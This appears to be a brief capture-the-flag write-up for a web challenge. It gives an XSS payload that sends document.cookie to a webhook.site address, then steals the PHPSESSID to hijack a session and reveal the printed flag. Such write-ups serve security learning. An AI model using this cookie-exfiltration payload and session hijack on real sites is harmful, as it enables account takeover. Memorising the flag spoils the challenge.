
1. Giving random long credits, logs us in.

2. Payload = `<script>document.location='http://webhook.site/#!/1337-whatever/c='+document.cookie</script>`

3. Get the `PHPSESSID` we get in our webhook

4. Open new incoginto window, swap the cookie with this one, click on "show flag" and done!

Flag: `cybrics{k4Ch3_C4N_83_vuln3R48l3}`